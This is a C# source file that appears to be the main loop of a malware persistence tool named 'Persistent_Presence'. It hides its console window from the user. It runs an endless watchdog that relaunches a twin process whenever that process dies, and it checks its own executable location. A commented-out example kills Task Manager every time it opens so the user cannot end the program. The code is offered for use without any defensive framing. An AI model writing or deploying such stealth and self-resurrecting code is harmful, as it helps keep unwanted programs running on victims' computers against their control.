using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace Persistent_Presence
{
    class Main_Class
    {
        #region <Hiding console application from taskbar.>
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        // const int SW_SHOW = 5;
        #endregion

        static void Main(string[] args)
        {

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE); // Hide

            Persistent_Presence persistent_presence_object = new Persistent_Presence();
            Background_Process_Twin backround_twin_process = new Background_Process_Twin();
            
            while (true)
            {
                Thread.Sleep(1000); // Sleep reduces CPU Usage from 40% down to 2.1%.
                if (backround_twin_process.check_processes() == false)
                {
                    Debug.WriteLine("[*] Duplicate Process Dead");
                    backround_twin_process.execute_twin_process();
                }
                persistent_presence_object.check_executable_location();
                /*
                #region Example of practical usage (Continuously closes task manager).
                try
                {
                    Process[] proc = Process.GetProcessesByName("Taskmgr");
                    if (proc.Length >= 1)
                    {
                        Debug.WriteLine(proc[0]);
                        Debug.WriteLine("[*] Task Manager Killed");
                        proc[0].Kill();
                    }
                }
                catch(Exception ex)
                {
                    Debug.WriteLine(ex);
                }
                #endregion
                */
            }
        
        }
    }
}
